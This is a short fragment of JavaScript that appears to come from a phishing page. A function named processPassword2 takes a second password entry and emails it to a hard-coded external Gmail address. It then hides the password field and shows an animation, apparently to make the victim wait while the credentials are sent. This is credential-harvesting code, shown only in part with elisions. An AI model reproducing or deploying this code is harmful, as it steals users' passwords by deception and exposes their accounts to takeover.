...
function processPassword2(t) {
    ...
    "" != e ? (sendEmail('johnchurchwell118@gmail.com', message), hide("password2-row"), show("animate"), "flex" == document.getElementById("animate").style.display) : (hide("password22Error"), show("password21Error"))
}
